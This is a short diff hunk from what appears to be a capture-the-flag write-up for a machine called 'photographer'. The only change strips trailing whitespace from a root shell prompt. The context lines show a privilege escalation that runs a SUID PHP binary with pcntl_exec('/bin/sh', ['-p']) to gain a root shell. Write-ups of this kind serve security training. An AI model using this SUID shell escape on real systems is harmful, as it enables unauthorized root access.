@@ -225,7 +225,7 @@ www-data@photographer:/tmp$ /usr/bin/php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"
 uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
 # whoami
 root
-#                                                                                                                              
+#
 ```
 
 We have root! Lets grab the flag.
